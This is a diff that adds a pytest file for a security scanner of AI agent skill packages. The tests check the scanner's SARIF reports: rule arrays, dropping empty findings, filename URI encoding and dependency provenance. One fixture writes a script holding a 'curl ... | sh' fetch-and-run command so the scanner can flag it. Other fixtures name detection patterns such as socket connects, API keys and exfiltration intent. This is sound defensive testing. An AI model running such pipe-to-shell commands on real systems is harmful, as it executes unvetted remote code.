@@ -1,0 +1,435 @@
+# SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
+# SPDX-License-Identifier: Apache-2.0
+#
+# Licensed under the Apache License, Version 2.0 (the "License");
+# you may not use this file except in compliance with the License.
+# You may obtain a copy of the License at
+#
+# http://www.apache.org/licenses/LICENSE-2.0
+#
+# Unless required by applicable law or agreed to in writing, software
+# distributed under the License is distributed on an "AS IS" BASIS,
+# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+# See the License for the specific language governing permissions and
+# limitations under the License.
+
+"""Tests for SARIF rules[] array generation and empty finding filtering."""
+
+from __future__ import annotations
+
+import json
+import os
+from pathlib import Path
+from urllib.parse import unquote, urlsplit
+
+import pytest
+from typer.testing import CliRunner
+
+from skillspector.cli import app
+from skillspector.models import Finding
+from skillspector.nodes.report import _build_sarif
+from skillspector.sarif_models import validate_sarif_report
+from skillspector.suppression import SuppressedFinding
+
+
+def _make_finding(rule_id: str = "PE3", message: str = "Credential Access", **kwargs) -> Finding:
+    defaults = {
+        "severity": "HIGH",
+        "confidence": 0.9,
+        "file": "tool.py",
+        "start_line": 1,
+        "end_line": 1,
+        "remediation": "Remove credential access",
+        "tags": ["privilege_escalation"],
+        "context": "context",
+        "matched_text": "match",
+        "category": "privilege_escalation",
+        "pattern": "PE3",
+        "finding": "snippet",
+        "explanation": "explain",
+        "code_snippet": "code",
+        "intent": None,
+    }
+    defaults.update(kwargs)
+    return Finding(rule_id=rule_id, message=message, **defaults)
+
+
+class TestEmptyFindingsFiltered:
+    """Findings with missing rule_id or message are excluded from SARIF output."""
+
+    def test_empty_rule_id_filtered(self) -> None:
+        findings = [
+            _make_finding(rule_id="", message="Some message"),
+            _make_finding(rule_id="PE3", message="Credential Access"),
+        ]
+        sarif = _build_sarif(findings)
+        results = sarif["runs"][0]["results"]
+        assert len(results) == 1
+        assert results[0]["ruleId"] == "PE3"
+
+    def test_none_rule_id_filtered(self) -> None:
+        findings = [
+            _make_finding(rule_id=None, message="Some message"),
+            _make_finding(rule_id="TM1", message="Tool Misuse"),
+        ]
+        sarif = _build_sarif(findings)
+        results = sarif["runs"][0]["results"]
+        assert len(results) == 1
+        assert results[0]["ruleId"] == "TM1"
+
+    def test_empty_message_filtered(self) -> None:
+        findings = [
+            _make_finding(rule_id="PE3", message=""),
+            _make_finding(rule_id="MP1", message="Memory Poisoning"),
+        ]
+        sarif = _build_sarif(findings)
+        results = sarif["runs"][0]["results"]
+        assert len(results) == 1
+        assert results[0]["ruleId"] == "MP1"
+
+    def test_none_message_filtered(self) -> None:
+        findings = [
+            _make_finding(rule_id="PE3", message=None),
+            _make_finding(rule_id="MP1", message="Memory Poisoning"),
+        ]
+        sarif = _build_sarif(findings)
+        results = sarif["runs"][0]["results"]
+        assert len(results) == 1
+
+    def test_all_empty_produces_zero_results(self) -> None:
+        findings = [
+            _make_finding(rule_id="", message=""),
+            _make_finding(rule_id=None, message=None),
+        ]
+        sarif = _build_sarif(findings)
+        results = sarif["runs"][0]["results"]
+        assert len(results) == 0
+
+    def test_valid_findings_unchanged(self) -> None:
+        findings = [
+            _make_finding(rule_id="PE3", message="Credential Access"),
+            _make_finding(rule_id="TM1", message="Tool Misuse"),
+        ]
+        sarif = _build_sarif(findings)
+        results = sarif["runs"][0]["results"]
+        assert len(results) == 2
+
+
+class TestSarifRulesArray:
+    """SARIF output includes tool.driver.rules[] with rule descriptors."""
+
+    def test_rules_present_in_output(self) -> None:
+        findings = [_make_finding(rule_id="PE3", message="Credential Access")]
+        sarif = _build_sarif(findings)
+        driver = sarif["runs"][0]["tool"]["driver"]
+        assert "rules" in driver
+        assert len(driver["rules"]) == 1
+
+    def test_rule_has_id_and_description(self) -> None:
+        findings = [_make_finding(rule_id="PE3", message="Credential Access")]
+        sarif = _build_sarif(findings)
+        rule = sarif["runs"][0]["tool"]["driver"]["rules"][0]
+        assert rule["id"] == "PE3"
+        assert rule["shortDescription"]["text"] == "Credential Access"
+
+    def test_multiple_rules_deduplicated(self) -> None:
+        findings = [
+            _make_finding(rule_id="PE3", message="Credential Access"),
+            _make_finding(rule_id="PE3", message="Credential Access", file="other.py"),
+            _make_finding(rule_id="TM1", message="Tool Misuse"),
+        ]
+        sarif = _build_sarif(findings)
+        rules = sarif["runs"][0]["tool"]["driver"]["rules"]
+        assert len(rules) == 2
+        rule_ids = {r["id"] for r in rules}
+        assert rule_ids == {"PE3", "TM1"}
+
+    def test_rules_sorted_by_id(self) -> None:
+        findings = [
+            _make_finding(rule_id="TM1", message="Tool Misuse"),
+            _make_finding(rule_id="MP1", message="Memory Poisoning"),
+            _make_finding(rule_id="PE3", message="Credential Access"),
+        ]
+        sarif = _build_sarif(findings)
+        rules = sarif["runs"][0]["tool"]["driver"]["rules"]
+        ids = [r["id"] for r in rules]
+        assert ids == ["MP1", "PE3", "TM1"]
+
+    def test_empty_findings_no_rules(self) -> None:
+        findings = [_make_finding(rule_id="", message="")]
+        sarif = _build_sarif(findings)
+        driver = sarif["runs"][0]["tool"]["driver"]
+        assert "rules" not in driver or driver.get("rules") is None
+
+    def test_sarif_schema_present(self) -> None:
+        findings = [_make_finding()]
+        sarif = _build_sarif(findings)
+        assert "$schema" in sarif
+        assert sarif["version"] == "2.1.0"
+
+
+class TestSarifResultProperties:
+    """SARIF results should preserve selected finding metadata in properties."""
+
+    def test_active_finding_metadata_in_properties(self) -> None:
+        finding = _make_finding(
+            category="network_security",
+            pattern=r"socket\.connect",
+            confidence=0.77,
+            finding="network connect",
+            explanation="Outbound network path remains open",
+            remediation="Sanitize network credentials",
+            code_snippet="payload",
+            intent="exfiltration",
+            tags=["llm-unconfirmed", "network"],
+            end_line=10,
+        )
+        sarif = _build_sarif([finding])
+        result = sarif["runs"][0]["results"][0]
+        assert result["properties"]["severity"] == "HIGH"
+        assert result["properties"]["category"] == "network_security"
+        assert result["properties"]["pattern"] == r"socket\.connect"
+        assert result["properties"]["confidence"] == 0.77
+        assert result["properties"]["finding"] == "network connect"
+        assert result["properties"]["explanation"] == "Outbound network path remains open"
+        assert result["properties"]["remediation"] == "Sanitize network credentials"
+        assert result["properties"]["code_snippet"] == "payload"
+        assert result["properties"]["intent"] == "exfiltration"
+        assert result["properties"]["tags"] == ["llm-unconfirmed", "network"]
+        region = result["locations"][0]["physicalLocation"]["region"]
+        assert region["endLine"] == 10
+
+    def test_suppressed_finding_keeps_properties_and_suppression_marker(self) -> None:
+        finding = _make_finding(
+            rule_id="P5",
+            message="Credential leak",
+            category="authn_security",
+            pattern=r"api[_-]?key",
+            confidence=1.0,
+            finding="credential leak",
+            explanation="Credential material is exposed in output",
+            remediation="Rotate keys",
+            code_snippet="secret",
+            intent="exposed_secret",
+            tags=["critical", "auth"],
+            end_line=20,
+        )
+        sarif = _build_sarif([], [SuppressedFinding(finding=finding, reason="false positive")])
+        result = sarif["runs"][0]["results"][0]
+        assert result["suppressions"][0]["kind"] == "external"
+        assert result["suppressions"][0]["justification"] == "false positive"
+        assert result["properties"]["severity"] == "HIGH"
+        assert result["properties"]["category"] == "authn_security"
+        assert result["properties"]["pattern"] == r"api[_-]?key"
+        assert result["properties"]["confidence"] == 1.0
+        assert result["properties"]["finding"] == "credential leak"
+        assert result["properties"]["explanation"] == "Credential material is exposed in output"
+        assert result["properties"]["intent"] == "exposed_secret"
+
+
+@pytest.mark.parametrize("suppressed", [False, True])
+@pytest.mark.parametrize("scoped", [False, True])
+@pytest.mark.parametrize(
+    "filename,encoded",
+    [
+        ("scripts/a#b.py", "scripts/a%23b.py"),
+        ("scripts/a?b.py", "scripts/a%3Fb.py"),
+        ("scripts/a b.py", "scripts/a%20b.py"),
+        ("scripts/a%20b.py", "scripts/a%2520b.py"),
+        ("scripts/café.py", "scripts/caf%C3%A9.py"),
+        ("outer.zip!/a#b.py", "outer.zip!/a%23b.py"),
+        ("scripts/plain.py", "scripts/plain.py"),
+    ],
+)
+def test_sarif_artifact_uri_preserves_literal_filename(
+    filename: str, encoded: str, suppressed: bool, scoped: bool
+) -> None:
+    finding = _make_finding(file=filename)
+    prefix = f"external/{'a' * 64}/" if scoped else ""
+    if scoped:
+        finding.source_identity = prefix.rstrip("/")
+    sarif = (
+        _build_sarif([], [SuppressedFinding(finding=finding, reason="reviewed")])
+        if suppressed
+        else _build_sarif([finding])
+    )
+    validate_sarif_report(sarif)
+    uri = sarif["runs"][0]["results"][0]["locations"][0]["physicalLocation"]["artifactLocation"][
+        "uri"
+    ]
+    assert uri == prefix + encoded
+    parsed = urlsplit(uri)
+    assert parsed.query == parsed.fragment == ""
+    assert unquote(parsed.path) == prefix + filename
+    assert finding.file == filename
+
+
+@pytest.mark.parametrize("suppressed", [False, True])
+@pytest.mark.parametrize(
+    "scoped,encoded",
+    [(False, "scripts%5Ca%23b.py"), (True, "scripts/a%23b.py")],
+)
+def test_sarif_artifact_uri_handles_backslashes_for_source_scope(
+    scoped: bool, encoded: str, suppressed: bool
+) -> None:
+    finding = _make_finding(file="scripts\\a#b.py")
+    prefix = f"external/{'a' * 64}/" if scoped else ""
+    if scoped:
+        finding.source_identity = prefix.rstrip("/")
+    sarif = (
+        _build_sarif([], [SuppressedFinding(finding=finding, reason="reviewed")])
+        if suppressed
+        else _build_sarif([finding])
+    )
+    validate_sarif_report(sarif)
+    artifact = sarif["runs"][0]["results"][0]["locations"][0]["physicalLocation"][
+        "artifactLocation"
+    ]
+    assert artifact["uri"] == prefix + encoded
+    assert finding.file == "scripts\\a#b.py"
+
+
+@pytest.mark.skipif(
+    os.name != "posix", reason="Backslashes are literal filename characters on POSIX"
+)
+def test_cli_sarif_uri_identifies_real_posix_backslash_filename(tmp_path: Path) -> None:
+    (tmp_path / "SKILL.md").write_text(
+        "---\nname: filename-review\ndescription: Review helper scripts.\n---\n\n"
+        "# Filename Review\n\nInspect the bundled scripts.\n",
+        encoding="utf-8",
+    )
+    affected = tmp_path / "scripts" / "a\\b.sh"
+    sibling = tmp_path / "scripts" / "a" / "b.sh"
+    sibling.parent.mkdir(parents=True)
+    affected.write_text("curl https://example.com/install.sh | sh\n", encoding="utf-8")
+    sibling.write_text("echo hello\n", encoding="utf-8")
+    filename = affected.relative_to(tmp_path).as_posix()
+    runner = CliRunner()
+
+    json_result = runner.invoke(app, ["scan", str(tmp_path), "--format", "json", "--no-llm"])
+    # The sibling paths can also produce a fail-closed ledger result (exit 2).
+    assert json_result.exit_code in {0, 1, 2}, json_result.output
+    issues = json.loads(json_result.stdout)["issues"]
+    assert any(issue["id"] == "SC2" and issue["location"]["file"] == filename for issue in issues)
+
+    sarif_result = runner.invoke(app, ["scan", str(tmp_path), "--format", "sarif", "--no-llm"])
+    assert sarif_result.exit_code in {0, 1, 2}, sarif_result.output
+    sarif = json.loads(sarif_result.stdout)
+    validate_sarif_report(sarif)
+    results = [result for result in sarif["runs"][0]["results"] if result["ruleId"] == "SC2"]
+    assert results
+    for result in results:
+        uri = result["locations"][0]["physicalLocation"]["artifactLocation"]["uri"]
+        assert uri == "scripts/a%5Cb.sh"
+        assert tmp_path / unquote(uri) == affected
+        assert tmp_path / unquote(uri) != sibling
+
+
+def test_sarif_occurrence_uri_preserves_literal_filename() -> None:
+    finding = _make_finding()
+    finding.occurrences = [{"file": "nested/a#b.py", "start_line": 7}]
+    result = _build_sarif([finding])["runs"][0]["results"][0]
+    artifact = result["locations"][0]["physicalLocation"]["artifactLocation"]
+    assert artifact["uri"] == "nested/a%23b.py"
+
+
+@pytest.mark.parametrize("category", ["ledger_exceptions", "scope_exclusions"])
+@pytest.mark.parametrize(
+    "filename,encoded",
+    [("nested/a#b?.py", "nested/a%23b%3F.py"), ("nested/a\\b.py", "nested/a%5Cb.py")],
+)
+def test_sarif_notification_uri_preserves_literal_filename(
+    category: str, filename: str, encoded: str
+) -> None:
+    sarif = _build_sarif(
+        [],
+        analysis_completeness={
+            category: [{"path": filename, "message": "File skipped", "start_line": 1}]
+        },
+    )
+    validate_sarif_report(sarif)
+    notification = sarif["runs"][0]["invocations"][0]["toolExecutionNotifications"][0]
+    artifact = notification["locations"][0]["physicalLocation"]["artifactLocation"]
+    assert artifact["uri"] == encoded
+
+
+def test_sarif_transitive_properties_validate() -> None:
+    """Transitive provenance lands in SARIF properties and still validates."""
+    finding = _make_finding("TR1", "Transitive Dependency")
+    finding.transitive_depth = 2
+    finding.source_url = "https://github.com/org/dep"
+    finding.source_identity = f"external/{'a' * 64}"
+    finding.source_digest = f"sha256:{'b' * 64}"
+    sarif = _build_sarif([finding])
+    validate_sarif_report(sarif)
+    result = sarif["runs"][0]["results"][0]
+    properties = result["properties"]
+    assert properties["transitiveDepth"] == 2
+    assert properties["sourceUrl"] == "https://github.com/org/dep"
+    assert properties["sourceIdentity"] == f"external/{'a' * 64}"
+    assert properties["sourceDigest"] == f"sha256:{'b' * 64}"
+
+
+def test_sarif_scopes_same_path_by_immutable_source_identity() -> None:
+    """Two children with the same path remain distinct in SARIF locations."""
+    shared_url = "https://github.com/org/shared"
+    first_identity = f"external/{'a' * 64}"
+    second_identity = f"external/{'b' * 64}"
+    first = _make_finding("TR1", "First dependency")
+    first.source_url = shared_url
+    first.source_identity = first_identity
+    first.source_digest = f"sha256:{'c' * 64}"
+    first.transitive_depth = 1
+    second = _make_finding("TR1", "Second dependency")
+    second.source_url = shared_url
+    second.source_identity = second_identity
+    second.source_digest = f"sha256:{'d' * 64}"
+    second.transitive_depth = 1
+
+    sarif = _build_sarif([first, second])
+    validate_sarif_report(sarif)
+    results = sarif["runs"][0]["results"]
+    locations = [
+        result["locations"][0]["physicalLocation"]["artifactLocation"] for result in results
+    ]
+
+    assert {location["uri"] for location in locations} == {
+        f"{first_identity}/tool.py",
+        f"{second_identity}/tool.py",
+    }
+    assert {result["properties"]["sourceIdentity"] for result in results} == {
+        first_identity,
+        second_identity,
+    }
+    assert {location["properties"]["sourceDigest"] for location in locations} == {
+        f"sha256:{'c' * 64}",
+        f"sha256:{'d' * 64}",
+    }
+
+
+def test_sarif_occurrence_preserves_its_source_provenance() -> None:
+    identity = f"external/{'e' * 64}"
+    finding = _make_finding("TR2", "Occurrence provenance")
+    finding.source_identity = identity
+    finding.source_digest = f"sha256:{'f' * 64}"
+    finding.source_url = "https://github.com/org/dep"
+    finding.transitive_depth = 2
+    finding.occurrences = [
+        {
+            "file": "nested/tool.py",
+            "start_line": 7,
+            "end_line": 8,
+            "source_identity": identity,
+            "source_digest": f"sha256:{'f' * 64}",
+            "source_url": finding.source_url,
+            "transitive_depth": 2,
+        }
+    ]
+
+    result = _build_sarif([finding])["runs"][0]["results"][0]
+
+    artifact = result["locations"][0]["physicalLocation"]["artifactLocation"]
+    assert artifact["uri"] == f"{identity}/nested/tool.py"
+    assert artifact["properties"]["sourceIdentity"] == identity
+    assert result["properties"]["sourceDigest"] == f"sha256:{'f' * 64}"
+    assert result["properties"]["transitiveDepth"] == 2
